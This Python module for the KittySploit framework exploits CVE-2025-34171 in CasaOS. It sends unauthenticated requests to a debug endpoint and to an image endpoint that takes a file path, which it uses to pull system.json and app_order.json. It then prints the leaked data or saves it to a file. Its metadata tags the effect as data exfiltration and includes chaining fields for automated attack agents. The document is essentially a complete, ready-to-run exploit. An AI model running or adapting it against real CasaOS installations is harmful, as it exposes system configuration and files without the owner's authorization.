#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CasaOS unauthenticated config/debug leak (CVE-2025-34171)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'CasaOS - Unauth Config/Debug Leak (CVE-2025-34171)',
        'description': (
            'Fetches CasaOS /v1/sys/debug and /v1/users/image?path=/var/lib/casaos/1/* '
            'without authentication (CVE-2025-34171).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2025-34171'],
        'platform': Platform.MULTI,
        'references': [
            'https://www.vulncheck.com/advisories/casaos-unauthenticated-file-and-debug-data-exposure',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-34171',
        ],
        'tags': ['casaos', 'icewhale', 'exposure', 'unauth', 'cve-2025-34171'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2025_34171_detect'],
            },
        },
    }

    output_file = OptString('', 'Local file to write leaked content', required=False)
    output_limit = OptInteger(
        12000,
        'Max chars to print when output_file empty (0=full)',
        required=False,
        advanced=True,
    )

    def run(self):
        chunks = []
        for path in (
            '/v1/sys/debug',
            '/v1/users/image?path=/var/lib/casaos/1/app_order.json',
            '/v1/users/image?path=/var/lib/casaos/1/system.json',
        ):
            print_status(f'Fetching {path} ...')
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if not body.strip():
                continue
            print_success(f'Got {len(body)} bytes from {path}')
            chunks.append(f'===== {path} =====\n{body}\n')

        if not chunks:
            print_error('No unauthenticated disclosure endpoints responded')
            return False

        content = '\n'.join(chunks)
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(content)
            print_success(f'Wrote leak to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(content if limit <= 0 else content[:limit])
        return True
